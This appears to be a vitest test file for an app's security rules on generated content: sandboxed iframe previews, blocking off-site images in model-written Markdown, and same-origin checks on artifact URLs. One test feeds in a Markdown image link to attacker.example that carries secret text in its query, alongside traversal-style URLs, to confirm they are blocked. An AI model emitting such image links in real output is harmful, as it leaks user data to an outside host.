/**
 * Generated content shown inside the app (SEC-4): what a preview may do before anyone clicks. Rendered to HTML with
 * react-dom/server; the browser-side behaviour (no request leaves) is the sandbox's and the CSP's.
 */
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { ArtifactPreview } from '../src/components/ArtifactPreview.tsx';
import { Markdown } from '../src/components/Markdown.tsx';
import { ScaledPage } from '../src/components/ScaledPage.tsx';
import { PageResult } from '../src/components/result/PageResult.tsx';
import { createViewerFlag, type FlagStorage } from '../src/components/viewerFlags.ts';
import { frameSandbox, isOwnArtifactUrl } from '../src/view/pages.ts';

const ID = `sha256:${'b'.repeat(64)}`;
const html = (el: Parameters<typeof renderToStaticMarkup>[0]) => renderToStaticMarkup(el);

describe('generated pages in the app', () => {
  it('run no scripts unless the person turned them on: a page could otherwise navigate itself and carry data out', () => {
    expect(frameSandbox(false)).toBe('');
    expect(frameSandbox(true)).toBe('allow-scripts');
    expect(html(createElement(ScaledPage, { src: `/artifacts/${ID}`, title: 'Draft A' }))).toContain('sandbox=""');
    expect(html(createElement(ScaledPage, { src: `/artifacts/${ID}`, title: 'Draft A', scripts: true }))).toContain('sandbox="allow-scripts"');
    // Never same-origin, scripts or not.
    expect(html(createElement(ScaledPage, { src: `/artifacts/${ID}`, title: 'Draft A', scripts: true }))).not.toContain('allow-same-origin');
  });

  it('show thumbnails as pictures with scripts off, and the finished page with scripts off until asked', () => {
    const thumb = html(createElement(ArtifactPreview, { id: ID, info: { mediaType: 'text/html' }, title: 'Draft A', size: 'thumb' }));
    expect(thumb).toContain('sandbox=""');
    const result = html(createElement(PageResult, { src: `/artifacts/${ID}`, title: 'My page' }));
    expect(result).toContain('sandbox=""');
    expect(result).toMatch(/aria-pressed="false"[^>]*>[^<]*Run the page’s scripts/);
  });
});

describe('Markdown from models', () => {
  it('shows byway’s own generated images, and never fetches an image from another site', () => {
    const own = html(createElement(Markdown, { text: `![Cyclists at dawn](/api/artifacts/${ID})` }));
    expect(own).toContain(`<img src="/api/artifacts/${ID}" alt="Cyclists at dawn"`);
    const outside = html(createElement(Markdown, { text: '![chart](https://attacker.example/p.png?d=SECRET-PROBLEM-TEXT-42)' }));
    expect(outside).not.toContain('<img');
    expect(outside).toContain('chart');
    expect(outside).toContain('not loaded');
    expect(outside).not.toContain('SECRET-PROBLEM-TEXT-42');
  });

  it('recognises only same-origin artifact addresses', () => {
    expect(isOwnArtifactUrl(`/api/artifacts/${ID}`)).toBe(true);
    expect(isOwnArtifactUrl(`/artifacts/${encodeURIComponent(ID)}`)).toBe(true);
    expect(isOwnArtifactUrl(`//attacker.example/artifacts/${ID}`)).toBe(false);
    expect(isOwnArtifactUrl(`https://attacker.example/api/artifacts/${ID}`)).toBe(false);
    expect(isOwnArtifactUrl(`/api/artifacts/${ID}/../../settings`)).toBe(false);
    expect(isOwnArtifactUrl(undefined)).toBe(false);
  });
});

describe('per-viewer switches', () => {
  function memory(): FlagStorage & { data: Map<string, string> } {
    const data = new Map<string, string>();
    return { data, getItem: (k) => data.get(k) ?? null, setItem: (k, v) => void data.set(k, v) };
  }

  it('remember a choice in this browser, and fall back to the default when storage is missing or refuses', () => {
    const store = memory();
    const flag = createViewerFlag('byway.test', false, () => store);
    expect(flag.get()).toBe(false);
    flag.set(true);
    expect(flag.get()).toBe(true);
    expect(store.data.get('byway.test')).toBe('1');
    const broken = createViewerFlag('byway.test', true, () => {
      throw new Error('blocked');
    });
    expect(broken.get()).toBe(true);
    broken.set(false);
    expect(broken.get()).toBe(false);
  });
});
